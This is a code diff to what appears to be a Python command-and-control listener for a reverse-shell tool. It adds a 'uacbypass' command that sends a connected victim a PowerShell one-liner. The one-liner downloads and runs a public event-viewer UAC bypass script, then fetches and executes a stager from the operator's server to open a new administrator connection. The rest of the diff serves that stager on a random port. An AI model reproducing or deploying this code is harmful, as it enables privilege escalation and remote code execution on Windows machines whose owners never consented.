@@ -96,7 +96,7 @@ def startClientListener():
 def interactShell(clientconn,clientnumber):
     computerName = ""
     from menu import clientMenuOptions
-    print "Commands\n" + "-"*24 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*24
+    print "Commands\n" + "-"*50 + "\nback - Background Shell\nexit - Close Connection\nuacbypass - UacBypass To Open New Admin Connection\n" + "-"*50
     while True:
         while clientconn in select.select([clientconn], [], [], 0.2)[0]:
             computerName += clientconn.recv(2048)
@@ -104,11 +104,13 @@ def interactShell(clientconn,clientnumber):
                 print t.bold_yellow + computerName + t.normal
 
         command = raw_input("> ")
-        if command == "back":
+        if command.lower() == "back":
             break
+        elif command.lower() == "uacbypass":
+            clientconn.sendall("IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-EventVwrBypass.ps1\");Invoke-EventVwrBypass -Command \"powershell.exe -c IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + "p.ps1" + "')\"")
         elif command == "":
             clientconn.sendall("\n")
-        elif command == "exit":
+        elif command.lower() == "exit":
             if str(clientnumber) in clientMenuOptions.keys():
                 print t.bold_red + "Client Connection Killed" + t.normal
                 del clientMenuOptions[str(clientnumber)]
@@ -159,6 +161,7 @@ def printListener():
     with open((payloaddir()+ '/' + powershellFileName), 'w') as powershellStagerFile:
         powershellStagerFile.write(windows_powershell_stager)
         powershellStagerFile.close()
+    global randoStagerDLPort # need to fix asap. Globals are shit fam
     randoStagerDLPort = random.randint(5000,9000)
     FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
     uacBypassStager = raw_input(t.bold_green + "Use UAC bypass for stager? y/[N]: " + t.normal)
